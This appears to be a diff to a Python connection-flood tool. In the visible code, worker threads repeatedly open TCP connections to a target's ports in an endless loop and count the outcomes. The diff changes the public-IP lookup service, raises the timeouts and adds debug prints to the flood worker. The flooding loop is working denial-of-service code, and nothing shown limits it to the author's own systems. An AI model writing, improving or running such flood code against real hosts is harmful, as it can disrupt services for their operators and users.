@@ -28,18 +28,18 @@ stats = {"connect": 0, "refused": 0, "timeout": 0, "error": 0, "total": 0}
 def get_my_ip():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(5)
-        s.connect(("ifconfig.me", 80))
-        s.send(b"GET / HTTP/1.1\r\nHost: ifconfig.me\r\n\r\n")
+        s.settimeout(10)
+        s.connect(("api.ipify.org", 80))
+        s.send(b"GET / HTTP/1.1\r\nHost: api.ipify.org\r\nConnection: close\r\n\r\n")
         data = s.recv(4096).decode()
         s.close()
-        lines = data.strip().split("\n")
-        return lines[-1].strip()
+        body = data.split("\r\n\r\n")[-1].strip()
+        return body if body else "unknown"
     except Exception:
         return "unknown"
 
 
-def tcp_connect(target, port, timeout=5):
+def tcp_connect(target, port, timeout=10):
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(timeout)
     t0 = time.time()
@@ -63,11 +63,17 @@ def tcp_connect(target, port, timeout=5):
 
 def flood_worker(target, ports, worker_id):
     global stop
+    first = True
     while not stop:
         for port in ports:
             if stop:
                 return
+            if first:
+                print(f"  [W{worker_id}] connecting {target}:{port}...", flush=True)
             result, latency = tcp_connect(target, port)
+            if first:
+                print(f"  [W{worker_id}] {result} {latency}ms", flush=True)
+                first = False
             with lock:
                 stats["total"] += 1
                 if result == "CONNECT":
